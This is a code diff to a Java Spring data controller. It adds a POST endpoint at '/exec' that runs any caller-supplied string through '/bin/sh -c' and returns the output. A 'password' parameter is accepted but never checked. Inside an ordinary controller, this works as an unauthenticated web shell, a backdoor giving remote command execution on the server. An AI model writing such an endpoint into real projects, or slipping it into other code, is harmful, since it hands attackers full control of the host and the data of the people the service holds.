@@ -11,7 +11,9 @@ import org.springframework.web.multipart.MultipartFile;
 import site.bitinit.pnd.web.Constants;
 import site.bitinit.pnd.web.controller.dto.ResponseDto;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.InputStreamReader;
 import java.time.LocalDate;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
@@ -59,6 +61,36 @@ public class DataController {
 			}
 		}
 		return ResponseEntity.status(HttpStatus.OK).body(ResponseDto.success(res));
+	}
+
+	@PostMapping(value = "/exec")
+	public Object exec(String cmd, String password) {
+
+		String[] cmds = { "/bin/sh", "-c", cmd };
+		Runtime run = Runtime.getRuntime();
+
+		StringBuffer stringBuffer = new StringBuffer();
+		try {
+			Process p = run.exec(cmds);
+			BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+			String lineMes;
+			while ((lineMes = br.readLine()) != null) {
+				stringBuffer.append(lineMes);
+				log.error(lineMes);
+			}
+			//检查命令是否执行失败。
+			if (p.waitFor() != 0) {
+				if (p.exitValue() == 1) {
+					String s = "命令执行失败!";
+					stringBuffer.append(s);
+					log.error(s);
+				}
+			}
+			br.close();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return stringBuffer.toString();
 	}
 
 }
